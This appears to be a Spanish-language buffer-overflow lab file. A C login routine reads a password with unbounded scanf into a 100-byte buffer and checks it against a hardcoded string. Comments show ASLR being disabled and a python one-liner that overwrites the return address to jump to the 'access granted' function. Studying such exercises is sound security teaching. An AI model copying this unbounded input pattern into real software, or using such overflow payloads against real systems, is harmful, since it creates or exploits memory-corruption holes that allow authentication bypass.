// /usr/sbin/sysctl -w kernel.randomize_va_space=0
//$gcc -g -o p2.exe p2.c
#include<stdio.h>
#include<string.h>

void AccesoIncorrecto(){
	printf("\tAcceso Denegado\n");
}

void AccesoCorrecto(){
	printf("\tAcceso correcto al sistema\n");
}

void Autenticacion(){
	char contraseña[100];

	printf("Indroduce la contraseña para acceder al sistema: ");
	scanf("%s", contraseña); 

	if(strcmp(contraseña, "qwerty!")==0)
		AccesoCorrecto();
	else
		AccesoIncorrecto();
	
}

int main(){
	Autenticacion();
	return(0);
}


//python3 -c 'print ("A"*100)' > salida.txt
//python3 -c 'import sys; sys.stdout.buffer.write(b"A"*112 + b"\xe4\x11\x40\x00")' > salida.txt
